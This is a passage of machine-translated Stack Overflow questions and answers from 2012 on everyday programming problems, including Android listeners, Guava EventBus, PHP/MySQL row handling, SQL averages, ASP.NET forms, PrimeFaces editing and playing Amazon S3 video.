有什么办法可以解决吗？还是我需要更改 SubGit 的某些设置？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T11:33:54.600

我是 SubGit 开发人员，很乐意帮助您解决此问题。首先，请将 SubGit 日志从 'F:\svn\testsubgit\subgit\subgit-sync-20121108-180124.zip 发送到 support@subgit.com

另外，请提供有关您的环境的更多详细信息，特别是：

a) 您的 Subversion 存储库在哪里（可能是网络驱动器）？b) 您是否使用 Apache 服务器（http 协议）访问 Subversion 存储库？c) 您是否使用相同的服务 (Apache) 来访问 Git 存储库？

首先要检查的是代表 Subversion 和 Git 服务运行的用户（帐户）。如果这些用户是不同的用户（例如系统管理员和网络服务），则可能存在权限问题 - 由一个服务创建的文件将变得对另一个服务不可用。当您运行“subgit configure”和“subgit install”时，还要确保代表运行 Apache 服务器（或其他服务）的同一用户运行这些命令。

如果您使用网络驱动器来存储 Subversion 存储库，那么网络驱动器配置可能是问题的原因，我建议您将存储库移动到服务器上的普通驱动器。

此外，服务器上安装的某些软件抗病毒软件可能会干扰 SubGit - 尝试禁用它。

要从这个错误中恢复，请按照[http://subgit.com/book/#recovery](http://subgit.com/book/#recovery)上的说明进行操作——最简单的方法是运行“subgit install --rebuild repos”——但是这样你可能会丢失一些提交吉特方面。

# android - 无法在 android 中使用 setKeyListener

> ID：13287191
> 
> 赞同：1
> 
> 时间：2012-11-08T10:29:56.720
> 
> 标签：android, android-widget, android-edittext

我在 EditText 中放置了一个按钮，我在主 XML 的起始代码处设置了不可见的按钮：

```
RelativeLayout android:layout_width="match_parent"
    android:layout_height="wrap_content" android:layout_marginTop="10dp">

    <EditText android:id="@+id/editText1" android:layout_width="fill_parent"
        android:layout_height="wrap_content" android:hint="@string/search_prompt"/>

    <Button android:id="@+id/button1" android:layout_width="40dp"
        android:layout_height="wrap_content" android:layout_alignBottom="@+id/editText1"
        android:layout_alignParentRight="true" android:layout_alignParentTop="true"
        android:layout_margin="5dp" android:background="@drawable/search"
        android:onClick="loadWeather" android:visibility="invisible"/>

</RelativeLayout> 
```

现在我希望只有在 EditText 中有一些文本时按钮才可见，如果 EditText 为空，则 Button 不应该是可见的，并且通过以下方式在 EditText 上设置了 setKeyListener 侦听器:::

```
final Button searchButton = (Button) findViewById(R.id.button1);

    final EditText myEditText = (EditText) findViewById(R.id.editText1);
    myEditText.setKeyListener(new KeyListener() {

        public boolean onKeyUp(View arg0, Editable arg1, int arg2, KeyEvent arg3) {
            // TODO Auto-generated method stub
            if(!myEditText.getText().equals("")){
                searchButton.setVisibility(View.VISIBLE);
            }
            return false;
        }

        public boolean onKeyOther(View arg0, Editable arg1, KeyEvent arg2) {
            // TODO Auto-generated method stub
            return false;
        }

        public boolean onKeyDown(View arg0, Editable arg1, int arg2, KeyEvent arg3) {
            // TODO Auto-generated method stub
            return false;
        }

        public int getInputType() {
            // TODO Auto-generated method stub
            return 0;
        }

        public void clearMetaKeyState(View arg0, Editable arg1, int arg2) {
            // TODO Auto-generated method stub

        }
    }); 
```

它使 Button 在开始时不可见，但现在我无法在 EditText 中输入任何文本，EditText 无法通过键盘获得任何输入。请告诉莫如何摆脱这个错误。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T10:48:52.067

改为使用

```
myEditText.addTextChangedListener(new TextWatcher() {
    @Override
    public void beforeTextChanged(CharSequence charSequence, int start, int count,      int after) {

    }

    @Override
    public void onTextChanged(CharSequence charSequence, int start, int before, int count) {
        if( count == 0){
            searchButton.setVisibility(View.INVISIBLE);
        }  else{
            searchButton.setVisibility(View.VISIBLE); 
        }
    }

    @Override
    public void afterTextChanged(Editable editable) {
        Log.v(TAG, "afterTextChanged");
    }
}); 
```

# guava - Guava EventBus：暂停事件发布

> ID：13287196
> 
> 赞同：3
> 
> 时间：2012-11-08T10:30:13.023
> 
> 标签：guava

有什么方法可以暂停来自番石榴库的 EventBus 事件发布。

我有一个`changeSomething()`发布事件的方法（例如`SomethingChangedEvent`）。现在这个方法被另一个方法循环调用`doStuff()`。问题是即使只有最后一次更改很重要`SomethingChangedEvent`，每次调用都会发布。`changeSomething()`由于事件的处理程序执行一些重量级计算，应用程序的性能会迅速下降。

最后一次`changeSomething()`执行后，我想告诉番石榴恢复事件处理。

有没有办法告诉番石榴忽略`SomethingChangedEvent`除最后一个之外的所有 s ？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T12:15:11.607

我尝试了这种模式，使用子类从毒丸模式派生：

```
 public class SomethingChangedEvent {

        private final String name;

        public SomethingChangedEvent(String name) {
            this.name = name;
        }

        @Override
        public String toString() {
            return name;
        }

    }

    public class IgnoreSomethingChangedEvent extends SomethingChangedEvent {
        public IgnoreSomethingChangedEvent(String name) {
            super(name);
        }

    }

    public class HandleSomethingChangedEvent extends SomethingChangedEvent {
        public HandleSomethingChangedEvent(String name) {
            super(name);
        }

    }

    private void eventBusTest() {
        EventBus eventBus = new EventBus();
        eventBus.register(new EventBusSomethingChanged());
        eventBus.post(new SomethingChangedEvent("process this one"));
        eventBus.post(new IgnoreSomethingChangedEvent("ignore"));
        eventBus.post(new SomethingChangedEvent("don't process this one"));
        eventBus.post(new HandleSomethingChangedEvent("handle"));
        eventBus.post(new SomethingChangedEvent("process this one bis"));
    }

    public class EventBusSomethingChanged {
        private boolean ignore;

        @Subscribe
        public void SomethingChanged(SomethingChangedEvent e) {
            if (e instanceof IgnoreSomethingChangedEvent) {
                ignore = true;
                return;
            }
            if (e instanceof HandleSomethingChangedEvent) {
                ignore = false;
                return;
            }
            if (!ignore) {
                System.out.println("processing:" + e);
            }
        }
    } 
```

# php - 如何在使用 PHP/MYSQL 循环时检查 Next Row 的值？

> ID：13287197
> 
> 赞同：0
> 
> 时间：2012-11-08T10:30:12.070
> 
> 标签：php

我使用此代码获得了 previousRow of record

```
<?php
  $previousRow = array();
  while ($temp = mysql_fetch_row($res2)) 
 {

     echo "<br>currentRow:".$temp[1];
     echo "previousRow:".$previousRow[1];
     $previousRow = $temp; 

  } 
 ?> 
```

## 输出

当前行：1上一个行：

当前行：5上一个行：1

当前行：6上一个行：5

当前行：7上一个行：6

当前行：8上一个行：7

如何检查由 Previous Row 替换的下一行的值？

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T10:36:46.923

如果我理解正确，那么这样的事情会有所帮助吗？

```
$previousRow = array();
$currentRow = mysql_fetch_row($res2);

while ($currentRow) {
    $nextRow = mysql_fetch_row($res2);

    echo "<br>currentRow:".$currentRow[1];
    echo "previousRow:".$previousRow[1];
    echo "nextRow:".$nextRow[1];

    $previousRow = $currentRow;
    $currentRow = $nextRow;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T11:33:39.510

请尝试下面给出的代码。

```
$res = array();
while ($result = mysql_fetch_row($r)) {
    $res[] = $result;
 }
 echo "<pre>";
 foreach($res AS $index=>$res1){
     echo "Current".$res1[1]; 
     echo "  Next" . $res[$index+1][1];
     echo "  Prev" . $res[$index-1][1]; echo "<br>";
 } 
```

谢谢

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T10:34:04.397

我会先收集所有行，然后用 for 遍历它们：

```
<?php
$rows = array();
while ($temp = mysql_fetch_row($res2)) 
{
    $rows[] = $temp;
}
$rowCount = count($rows);
for ($i = 0; $i < $rowCount; $i++) {
     echo "<br>currentRow:".$rows[$i][1];
     if ($i > 0) {
         echo "previousRow:".$rows[$i - 1][1];
     }
         if ($i + 1 < $rowCount - 1) {
             echo "nextRow:".$rows[$i + 1][1];
         }
} 
?> 
```

# sql - SQL AVG() 函数返回不正确的值

> ID：13287199
> 
> 赞同：4
> 
> 时间：2012-11-08T10:30:20.963
> 
> 标签：sql, average

我想在 sql 中使用 AVG 函数来返回某些值的工作平均值（即基于上周而不是总体平均值）。我正在计算两个值，即*体重*和*restingHR*（心率）。我对每个都有以下 sql 语句：

```
SELECT AVG( weight ) AS average 
FROM   stats 
WHERE  userid='$userid' 
ORDER BY date DESC LIMIT 7

SELECT AVG( restingHR ) AS average 
FROM   stats 
WHERE  userid='$userid' 
ORDER BY date DESC LIMIT 7 
```

我得到的*重量*值是**82.56**，但它应该是**83.35** 这不是一个大错误，我在使用它时会四舍五入，所以没什么大不了的。

然而，对于*restingHR* ，我得到**45.96**，而它应该是**57.57**，这是一个巨大的差异。

我不明白为什么这会出错。任何帮助深表感谢。

谢谢

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-08T10:49:48.113

使用子查询将选择行与计算平均值分开：

```
SELECT AVG(weight) average
FROM (SELECT weight
      FROM stats
      WHERE userid = '$userid'
      ORDER BY date DESC
      LIMIT 7) subq 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-08T10:49:27.643

似乎您想使用 过滤数据`ORDER BY date DESC LIMIT 7`，但您必须考虑，该子句在其他所有操作完成**后**`ORDER BY`才会生效。因此，您的函数会考虑来自您的 restingHR 的所有值，而不仅仅是最新的 7 个值。**`AVG()``$userId`**

 **为了克服这个......好吧，Barmar 刚刚发布了一个查询。**

# java - 防止从 setup.exe 或 jar 中提取数据

> ID：13287210
> 
> 赞同：1
> 
> 时间：2012-11-08T10:30:44.347
> 
> 标签：java, installation, setup-project, executable-jar

我正在通过使用 Inno Setup 作为 exe 来设置 java swing 应用程序，我正在选择我的项目的 jar 文件，我还将其他必要的资源添加为文件夹。

当我在客户端安装设置时。它将 jar 和其他资源放在程序文件文件夹中，但客户端可以从 jar 中提取我的 java 类和其他资源。我希望客户只能通过应用程序使用资源，但他无法提取资源。这怎么可能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T10:52:23.273

从字面上看，您无法完全阻止某人提取资源。

你能做的最好的就是让这个过程有点困难；例如，通过将资源以加密形式存储在 JAR 文件中。问题是您的程序需要解密资源才能使用它们。具有足够技能和耐心的人可以对您的解密代码进行逆向工程并捕获未加密的资源。

顺便说一句，这不是 Java 特有的问题。您作为可执行文件提供给用户的任何应用程序都可以进行逆向工程……假设用户首先有足够的资金来运行它。

* * *

底线是，如果您没有准备好有人可能会提取资源，您不应该分发可执行文件。

# ios - SPTrack 声明它已加载，但元数据未加载

> ID：13287211
> 
> 赞同：1
> 
> 时间：2012-11-08T10:30:45.143
> 
> 标签：ios, spotify, cocoalibspotify-2.0

有一次，我`SPTrack`在一个`NSArray`. 在粗略的互联网连接上（即在加载期间连接/断开连接）时，我遇到了一些意想不到的（？）加载结果：音轨包含在`loadedItems`数组中，但没有加载它们的元数据。

根据`SPTrack.h`，应在以下时间加载所有`loaded`数据`YES`：

```
/** Returns `YES` if the track has finished loading and all data is available. */ 
@property (nonatomic, readonly, getter=isLoaded) BOOL loaded; 
```

**我做错了什么，或者这可能是 CocoaLibSpotify 的问题吗？**

* * *

***我的代码：***

```
[SPAsyncLoading waitUntilLoaded:tracks timeout:kTrackLoadingTimeout then:^(NSArray *loadedItems, NSArray *notLoadedItems) {
    for (SPTrack *track in loadedItems) {
            NSLog(@"%@ loaded %i", track, track.loaded);
    }

    // ... then do stuff with the loaded tracks

}]; 
```

***控制台输出：***

```
<SPTrack: 0xc65c180>: Teardrop loaded 1
<SPTrack: 0xc3d86f0>: (null) loaded 1
<SPTrack: 0xc3b5730>: (null) loaded 1
<SPTrack: 0xc3ca660>: (null) loaded 1
<SPTrack: 0xc3c9c50>: (null) loaded 1
<SPTrack: 0xc3c9cf0>: (null) loaded 1
<SPTrack: 0xc3c96c0>: (null) loaded 1
<SPTrack: 0xc3c9820>: (null) loaded 1
<SPTrack: 0xc3ca1a0>: (null) loaded 1
<SPTrack: 0xc3c9020>: (null) loaded 1
<SPTrack: 0xc36fcf0>: (null) loaded 1
<SPTrack: 0xc3c8e60>: (null) loaded 1
<SPTrack: 0xc3c8c00>: (null) loaded 1
<SPTrack: 0xc3c8920>: 5 O'Clock Featuring Lily Allen & Wiz Khalifa loaded 1
<SPTrack: 0xc3c8660>: (null) loaded 1
<SPTrack: 0xc394850>: (null) loaded 1
<SPTrack: 0xc3ec040>: (null) loaded 1
<SPTrack: 0xc3896a0>: (null) loaded 1
<SPTrack: 0xc3c83e0>: (null) loaded 1
<SPTrack: 0xc3be530>: (null) loaded 1 
```

# c# - C#/aspx.net 处理 Post Values 表单

> ID：13287216
> 
> 赞同：1
> 
> 时间：2012-11-08T10:30:57.840
> 
> 标签：c#, asp.net

我对 aspx 开发很陌生，我在 aspx 代码和 aspx.cs 的连接方面遇到了很多困难，正是我遇到了以下问题：

显示字符.aspx：

```
<form id="form1" runat="server">
<div>   
    <div>Champion name: </div> <div><input id="Champ_name" type="text" /></div>
    <div>Champion Icon URL: </div> <div><input id="Champ_icon" type="text" /></div>
    <div>Champion Subtext: </div> <div><input id="Champ_subtext" type="text" /></div>
    <div> Free to play :</div><div><input id="Champ_freetoplay" type="checkbox" />
</div>
<div>Positions:</div>
<div>
        <input id="Top" type="checkbox" /> Top
        <input id="Mid" type="checkbox" /> Mid
        <input id="Jungle" type="checkbox" /> Jungle
        <input id="Carry" type="checkbox" /> Carry
        <input id="Support" type="checkbox" /> Support
</div>
</div>
    <input id="Champ_Submit" type="submit" value="submit" /> 
```

DisplayChars.aspx.cs

```
 if (IsPostBack)    
        {
            //NameValueCollection nvc = Request.Form.GetValues
            //Champion t1 = new Champion(Request.Form.Get("Champ_Name"), Int32.Parse(Request.Form.Get("Champ_freetoplay")), Request.Form.Get("Champ_subtext"), Request.Form.Get("Champ_description"), "10110");
            //t1.persistChampion();
            string temp = Request["Champ_name"]; 
```

所以我正在努力以某种方式获取表单值。我试过了`Request.Form.GetValues`，`Request.Form.Get`甚至`Request["Form_id_Name"]`。

问题是，如果这种方法是正确的，正如我在面向对象编程中所经历的那样，但不是在这种 HTML aspx 伪服务器代码和其背后的 cs 文件的组合中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T11:10:50.710

如果您添加`runat="server"`HTML 标签，并且您可以从代码隐藏中访问它们的属性：

```
// DisplayChars.aspx:
<input id="Champ_name" type="text" runat="server" />
...

// DisplayChars.aspx.cs:
string champName = Champ_name.Value; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T11:12:50.330

虽然你可以做

```
Request.Form["Champ_name"] 
```

这不是 asp.net 的方式。您必须通过添加使该元素成为服务器控件，`runat="server"`以便您可以从后面的代码中引用它。

```
<asp:Button ID="Champ_name" runat="server" OnClick="button_Click" Text="Hello World" /> 
```

然后在您的代码隐藏中添加一个方法以在单击该按钮时触发：

```
protected void button_Click(object sender, EventArgs e) 
{
   // logic processing here
} 
```

如果您需要找出按钮的文本是什么：

```
string text = Champ_name.Text; 
```

基本上，ASP.NET 不正常依赖`Request.Form`。您将控件设置为，`runat="server"`以便您可以在回发时直接从代码隐藏中处理它们。

# c# - asp.net webconfig Debug=true 和解决方案配置为 Debug

> ID：13287218
> 
> 赞同：0
> 
> 时间：2012-11-08T10:31:06.160
> 
> 标签：c#, asp.net, web-config, debug-mode

> **可能重复：**
> [<compilation debug="true"> 之间的区别 和 .csproj 文件设置？](https://stackoverflow.com/questions/9934570/difference-between-compilation-debug-true-and-csproj-file-settings)

在 ASP.net Web 应用程序中，您有两个“调试”设置。一个是在 webconfig 本身中，另一个是在 Visual Studio 中实际编译解决方案时。首先，这些有关系吗？

我们在 Visual Studio 中编译为“发布”时通常遇到的一个问题是，当尝试通过堆栈跟踪/日志文件诊断错误时：

1.  行号不匹配
2.  有时，甚至没有显示行号

这对于在实时环境中对应用程序进行故障排除是非常有问题的，并且对我来说几乎是一个交易破坏者。

在 webconfig 中设置 debug=true 和在 Debug 模式下编译有什么区别，你可以在 web.config 中设置 debug=false，同时在 Debug 模式下编译吗？

# jquery - 使用返回/输入键将编辑的单元格保存在 Primefaces 3.4 单元内可编辑数据表中

> ID：13287220
> 
> 赞同：7
> 
> 时间：2012-11-08T10:31:14.177
> 
> 标签：jquery, jsf, primefaces

正如标题所说，我不想在切换到编辑模式后单击“保存”按钮，而是希望在按下回车键时具有相同的功能。

我试图用 p:hotkey 来做到这一点，但显然 p:hotkey 不适用于有针对性的可编辑组件。

除了深入研究 JQuery 之外，还有其他方法可以做到这一点吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-09-04T12:24:17.610

> *除了深入研究 JQuery 之外，还有其他方法可以做到这一点吗？*

是的，使用普通的 JS。但这最终可能会导致非跨浏览器兼容的样板代码。不开玩笑，不，这是不可能通过 JSF 实现的，因为魔术确实需要在客户端发生。由于`<p:cellEditor>`不支持所请求的功能（否则它只能自己生成必要的 jQuery 代码），您需要自己编写它。

去过也做过：

```
$(document).on("keydown", ".ui-cell-editor-input input", function(event) {
    if (event.keyCode == 13) {
        $(this).closest("tr").find(".ui-row-editor .ui-icon-check").click();
    }
}); 
```

只需将其放入某个全局 JS 文件中即可。这涵盖了单元格编辑器中的所有输入字段。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-10-07T11:38:18.290

[BalusC 代码](https://stackoverflow.com/a/18613759/522578)的略微修改版本（另见[PrimeFaces 问题 433](https://github.com/primefaces/primefaces/issues/433)）：

*   防止在“Enter”单击时向表中添加新行
*   取消编辑“Escape”点击

```
$(document).on("keydown", ".ui-cell-editor-input input", function(event) {
    if (event.keyCode == 13) { // Enter
        $(this).closest("tr").find(".ui-row-editor .ui-icon-check").click();
        return false; // prevents executing other event handlers (adding new row to the table)
    }
    if (event.keyCode == 27) { // Escape
        $(this).closest("tr").find(".ui-row-editor .ui-icon-close").click();
        return false;
    }
}); 
```

# c# - 按钮单击绑定到自定义列表视图中的多个视图

> ID：13287222
> 
> 赞同：0
> 
> 时间：2012-11-08T10:31:23.333
> 
> 标签：c#, android, xamarin.android

我正在为列表视图使用自定义列表适配器。我在列表视图中定义了一个按钮并且点击事件有效，但问题是一旦滚动列表，它将多个视图绑定到同一个按钮。因此，在单击按钮时，会触发与每个关联视图关联的事件。

我该如何处理？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-02T19:17:31.557

Stuart 是完全正确的 - 问题是 ListView 中的视图被重用（以避免创建不同的对象），并且由于列表的不同部分是可见的，对于一个新位置，您可以获得任何不再使用的视图。所以你的代码应该正确处理这个问题。我想补充一点，monodroid 中 Java 对象的垃圾收集效果不好。根据我的经验，创建大量从 Java.Lang.Object 派生的对象会使应用程序崩溃。所以：

1.  为每个新行创建新视图将很快使应用程序崩溃，因此您必须尽可能重用 convertView。

2.  Tag 具有 Java.Lang.Object 类型，因此 WrappedPosition 应该派生自 Java 对象。这意味着您应该重用相同的实例，而不是每次都创建新实例。

3.  如果您将点击处理程序移动到单独的方法，您可以在订阅之前取消订阅，因此您不需要任何逻辑“如果视图为空”。

如果您觉得它有用，我可能会在此处发布解释其工作原理的代码示例。最初不要发布它，因为它很大:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-09T16:35:50.363

我猜你误解了列表的工作原理——尤其是 convertView 的使用方式。

Android 中的 ListViews 虚拟化 UI - 就像 WP 中的 ListBoxes 和 iOS 中的 UITableViews 一样

这意味着，如果底层列表有 1000 个项目，但屏幕上只有 10 个项目的空间，那么列表将只创建 10 个“容器”来显示列表项目，并使用这些容器仅显示内容在当时看来。

它这样做的方式是通过适配器 - 特别是通过 GetView 回调 - 它将 convertView 作为其参数之一。

如果您选择在 GetView 实现中创建新视图，则可以在回调中订阅新事件...

如果您选择在 GetView 实现中使用 convertView，那么您不应该在回调中订阅新事件 - 除非先取消订阅旧事件。

例如，我猜你的代码目前正在执行类似这样的伪操作：

```
 public View GetView(int pos, View convertView)
 {
     TextView toShow = convertView as TextView;
     if (toShow == null)
     {
        toShow = new TextView();
     }

     toShow.Text = "Item at position " + i;
     toShow.Click += (s,e) => {
         // do something
     };

     return toShow;
 } 
```

代码的问题是您会经常订阅 Click ...您需要通过以下方式解决它：

```
 public View GetView(int pos, View convertView)
 {
     TextView toShow = convertView as TextView;
     if (toShow == null)
     {
        toShow = new TextView();
        toShow.Click += (s,e) => {
            // do something with the position embedded in toShow.Tag
        };
     }

     toShow.Text = "Item at position " + i;
     toShow.Tag = new WrappedPosition(i);
     return toShow;
 } 
```

反正这是我的猜测:)

# php - Sphinx 搜索 - 属性的 Where 条件

> ID：13287225
> 
> 赞同：0
> 
> 时间：2012-11-08T10:31:39.630
> 
> 标签：php, mysql, search, sphinx

```
sql_attr_multi = uint categories from query; SELECT item_id, category_id FROM items_categories WHERE value=2 
```

我怎样才能继续通过**sphinxapi****传递值**变量？我需要它来过滤**attr****并且**我**不能使用 setFilter**。

 ******谢谢******

# mysql - MySQL 错误 2013 (HY000)

> ID：13287231
> 
> 赞同：2
> 
> 时间：2012-11-08T10:32:05.390
> 
> 标签：mysql, iis-7, mysql-error-2013

我正在尝试在本地 MySQL 安装上导入一个大型数据库（.sql 文件为 300MB），它导入大约两秒钟，然后我收到以下错误消息：

```
ERROR 2013 (HY000) at line 457: Lost connection to MySQL server during query 
```

显然这是一个相当常见的错误消息，但我尝试了各种不同的东西（所有这些都没有解决我的问题）

很多人引用了一个需要编辑的`my.cnf`/`my.ini`配置文件，问题是我一辈子都找不到这个文件，我`.ini`在这个目录中找到了各种文件：

```
C:\Program Files\MySQL\MySQL Server 5.5 
```

但是没有一个有title `my.ini`，所以（我不确定这是否正确）我只是创建了一个my.ini和my.cnf文件并将它们放在上面的目录中，这个文件的内容如下：

```
[mysqld]
max_allowed_packet = 400M
innodb_force_recovery = 4
net_read_timeout = 100
interactive_timeout = 100
wait_timeout = 100
connect_timeout = 100
skip-name-resolve

[mysqldump]
max_allowed_packet = 400M 
```

首先，我不确定配置文件的实际位置（我已经尝试在我的计算机上搜索`my.ini`and `my.cnf`，但都无济于事）那么有什么办法可以找到它吗？

其次，问题是否与配置文件中的设置完全无关？还有其他可能导致这种情况的原因吗？

一些背景资料：

*   我要恢复的数据库是 Magento 数据库
*   我在 IIS7 上运行它（不认为这是相关的，因为问题出在 MySQL 上）
*   MySQL版本是5.5

我尝试使用 MySQL 工作台和 SQLyog 社区版导入数据库，但它们都在几乎相同的地方失败（我认为 SQLyog 早/晚失败了大约 2 行）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-19T14:46:26.990

最后我重新安装了 MySQL，仅此一项似乎就解决了问题（很奇怪！）

# android - 如何在 Android 应用程序中播放来自 Amazon S3 的视频？

> ID：13287233
> 
> 赞同：8
> 
> 时间：2012-11-08T10:32:11.100
> 
> 标签：android, video, amazon-s3, amazon-web-services, bytearrayoutputstream

我 `aws-android-sdk-1.4.3/samples/S3_SimpleDB_SNS_SQS_Demo`用来预览存储在 Amazon (Amazon Simple Storage Service) 上的文件。查看代码，我看到他们使用它来访问文件：

`com.amazonaws.demo.s3.S3.getDataForObject (line 130)`

```
 public static String getDataForObject( String bucketName, String objectName ) {
        return read( getInstance().getObject( bucketName, objectName ).getObjectContent() );
    }

protected static String read( InputStream stream ) {
    try {
        ByteArrayOutputStream baos = new ByteArrayOutputStream( 8196 );
        byte[] buffer = new byte[1024];
        int length = 0;
        while ( ( length = stream.read( buffer ) ) > 0 ) {
            baos.write( buffer, 0, length );
        }

        return baos.toString();
    }
    catch ( Exception exception ) {
        return exception.getMessage();

    }
} 
```

}

好吧，我已经修改了这个方法以返回`ByteArrayOutputStream`，然后我很容易将它转换为`String`or `Bitmap`（应用`ByteArrayOutputStream.toByteArray()`然后使用 `BitmapFactory.decodeByteArray(byte[] data, int offset, int length, Options opts)`）。

因此，它适用于文本文件和图片。我的问题是当我尝试访问视频时。所以，我的问题是：

1.使用上面提供的方法，我怎样才能从`ByteArrayOutputStream`( `ByteArrayOutputStream.toString()`) 中获取视频并以a`VideoView`或 using`MediaPlayer`或a 方式播放...？

2\. 有人知道亚马逊上存储的预览视频问题的其他解决方案吗？（我听说他们`sdk`使用`IOS`URL 来访问文件......）

PS：提供文件 URL 并在浏览器中打开它是没有意义的，因为这个 URL 会在一段时间后过期。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-09T10:14:14.607

首先，我们必须提供存储桶的名称和`aws-android-sdk-1.4.3/samples/S3_SimpleDB_SNS_SQS_Demo`要打开的对象（请参阅完整指南），然后获取对象的 URL：

```
 AWSCredentials myCredentials = new BasicAWSCredentials("YOUR_AMAZON_ACCESS_KEY_ID", "YOUR_AMAZON_SECRET_KEY_ID");
    AmazonS3 s3client = new AmazonS3Client(myCredentials);
    GeneratePresignedUrlRequest request = new GeneratePresignedUrlRequest(bucketName, objectName);
    URL objectURL = s3client.generatePresignedUrl(request); 
```

现在，只需在视频视图中播放视频，提供获得的 URL：

```
 getWindow().setFormat(PixelFormat.TRANSLUCENT);
    mediaCtrl = new MediaController(this);
    mediaCtrl.setMediaPlayer(videoView);
    videoView.setMediaController(mediaCtrl);
    Uri clip = Uri.parse(objectURL.toString());
    videoView.setVideoURI(clip);
    videoView.requestFocus();
    videoView.start(); 
```

我要感谢@CommonsWare

*   通过指示我`REST API`（即使我使用的代码来自`aws-sdk`阅读`REST API`文档也帮助了我并展示了请求亚马逊对象的其他方式）

*   指示我使用`generatePresignedUrl()`

*   播放视频的代码[也受到了他的材料的启发](https://github.com/commonsguy/cw-advandroid/blob/master/Media/Video/src/com/commonsware/android/video/VideoDemo.java)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-08T11:22:09.260

> 1.使用上面提供的方法，我如何从 ByteArrayOutputStream (ByteArrayOutputStream.toString()) 中获取视频并在 VideoView 或使用 MediaPlayer 或方法播放它...？

*也许*您可以通过 a`ContentProvider`和发布字节数组来使其工作`openFile()`。[这是一个示例项目](https://github.com/commonsguy/cw-omnibus/tree/master/ContentProvider/Pipe)，我在其中演示了以`InputStream`这种方式通过自定义方式提供文件。

不过，媒体子系统相当繁琐，所以我不会给你很好的机会。

> 2\. 有人知道亚马逊上存储的预览视频问题的其他解决方案吗？（我听说在他们的 IOS sdk 上，他们使用 URL 来访问文件......）

最后我检查了一下，S3 有一个 REST API，您可以使用它来生成视频的 URL。我会将该 URL 交给`MediaPlayer`or `VideoView`。

> 提供文件 URL 并在浏览器中打开它是没有意义的，因为这个 URL 会在一段时间后过期。

但是你可以控制“a wile [sic]”的长度。让它成为24小时或什么的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-11-23T14:26:51.153

@AlexAndro 回答

```
AWSCredentials myCredentials = new BasicAWSCredentials("YOUR_AMAZON_ACCESS_KEY_ID", "YOUR_AMAZON_SECRET_KEY_ID");
AmazonS3 s3client = new AmazonS3Client(myCredentials);
GeneratePresignedUrlRequest request = new GeneratePresignedUrlRequest(bucketName, objectName);
URL objectURL = s3client.generatePresignedUrl(request);

getWindow().setFormat(PixelFormat.TRANSLUCENT);
mediaCtrl = new MediaController(this);
mediaCtrl.setMediaPlayer(videoView);
videoView.setMediaController(mediaCtrl);
Uri clip = Uri.parse(objectURL.toString());
videoView.setVideoURI(clip);
videoView.requestFocus();
videoView.start(); 
```

解决了我的问题，但它需要使用定义您的区域

```
s3client.setRegion(Region.EU_Paris.toAWSRegion()) 
```

`EU_Paris`是为了`eu-west-3`

在这里您可以找到所有[地区](https://docs.aws.amazon.com/general/latest/gr/rande.html#s3_region)

# javascript - 使用 JQuery 创建同页事件

> ID：13287240
> 
> 赞同：0
> 
> 时间：2012-11-08T10:32:24.500
> 
> 标签：javascript, jquery, css, hyperlink

当锚链接与当前页面具有相同的 URL 时，我试图让 jquery 触发一个事件。最终，这将为锚链接添加一个类，并让我使用 CSS 对其进行不同的样式设置，但现在我只希望它显示一个警告框。下面的代码似乎不起作用：

```
<script type="text/javascript">
$(document).ready(function() {

var buildurl = window.location.href;

if($('a').attr('href') = buildurl){

    alert("Done");

}

});
</script> 
```

任何人都可以阐明为什么这不起作用？或者类似使用 JQuery 的最佳实践？

链接为：[http ://www.otahboy.com/shop/index.php?route=information/information&information_id=4](http://www.otahboy.com/shop/index.php?route=information/information&information_id=4)

干杯，

杰克

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T10:35:01.090

```
<script type="text/javascript"> 

$(document).ready(function() {

var buildurl = window.location.href;

if($('a').attr('href') == buildurl){

    alert("Done");

}

}); 

</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T10:36:35.377

使用相等运算符**`==`**

```
if($('a').attr('href') == buildurl){

    alert("Done");
$('a').attr("color","Red");
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T10:37:07.343

您的 if 条件中有一个任务。您需要在其中添加一个 =。

```
<script type="text/javascript">
$(document).ready(function() {

var buildurl = window.location.href;

if($('a').attr('href') == buildurl){

    alert("Done");

}

});

</script> 
```

# ios - Viewdidload 工作，而 viewwillappear 延迟

> ID：13287246
> 
> 赞同：0
> 
> 时间：2012-11-08T10:32:53.497
> 
> 标签：ios, frame, viewdidload, viewwillappear

我有一个项目，我正在与另一个视图切换一个视图：

```
- (IBAction)onClick:(id)sender
{
ViewControllerSecond * sc=[[ViewControllerSecond alloc]initWithNibName:@"ViewControllerSecond" bundle:nil];
[UIView transitionFromView:self.view toView:sc.view duration:3.0
                   options:UIViewAnimationOptionTransitionFlipFromLeft completion:^(BOOL finished) {

}];
} 
```

我在这里用 3 秒来说明一点。在第二个视图中，我有一个方法来更新从视图控制器添加另一个视图的 GUI：

```
 -(void)updateGUI
{

    sample=[[ViewControllerSample alloc]initWithNibName:@"ViewControllerSample" bundle:nil];
    sample.view.frame=CGRectOffset(sample.view.frame, 0, 150);
    [self.view addSubview:sample.view];
} 
```

现在，问题来了：当我从 viewDidLoad 函数调用它时——它工作得很好。但是，如果从 viewWillAppear 函数调用，视图将出现在屏幕顶部，并且只有在动画结束后才会跳转到它的位置。如何修复？

* * *

